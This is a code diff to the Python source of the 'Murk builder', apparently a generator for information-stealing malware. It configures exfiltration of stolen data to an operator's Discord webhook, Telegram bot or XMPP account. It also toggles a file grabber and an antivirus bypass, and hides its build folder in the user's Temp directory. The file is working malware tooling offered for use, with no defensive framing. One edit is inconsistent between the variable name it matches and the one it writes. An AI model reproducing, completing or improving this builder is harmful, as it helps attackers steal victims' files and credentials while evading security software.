@@ -51,8 +51,8 @@ class Builder():
         print("\033[34m{}\033[0m".format(self.logo))
         print("\033[33m{}\033[0m".format("(i) Welcome to the Murk builder\n\n"))
         self.type = ""
-        while self.type != "Telegram" and self.type != "Discord" and self.type != "XMPP":
-            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Telegram/Discord/XMPP)"))
+        while self.type != "Discord" and self.type != "Telegram" and self.type != "XMPP":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Discord/Telegram/XMPP)"))
             self.type = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         print("\n\n")
         return self.type
@@ -137,6 +137,10 @@ class Builder():
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
             extracted_zip.extractall(pwd=str.encode('pwd'))
         temp = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Temp'
+        try:
+            shutil.rmtree(temp + os.sep + 'buildingCache/', ignore_errors=True)
+        except:
+            pass
         shutil.move('buildingCache/',temp)
         win32api.SetFileAttributes(temp + os.sep + 'buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
         
@@ -144,7 +148,7 @@ class Builder():
             data = f.read()
 
         if self.fileGrab == "Y" or self.fileGrab == "y":
-            data = data.replace('enableFileGrubber = False #enable file grabber', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrabber = False #enable file grabber', 'enableFileGrubber = True')
 
         if self.avBypass == "Y" or self.avBypass == "y":
             data = data.replace('avbypass = False #enable antiviruses bypass', 'avbypass = True')
@@ -163,7 +167,7 @@ class Builder():
             data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{self.urlWebHook}","{self.name}"]')
         if self.type == "Telegram" :
             data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
-            data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{self.token}","{self.id}"]')
+            data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{self.HTTP}","{self.ID}"]')
         if self.type == "XMPP" :
             data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
             data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{self.jabberid}","{self.jabberpassword}","{self.jabberreceiver}"]')
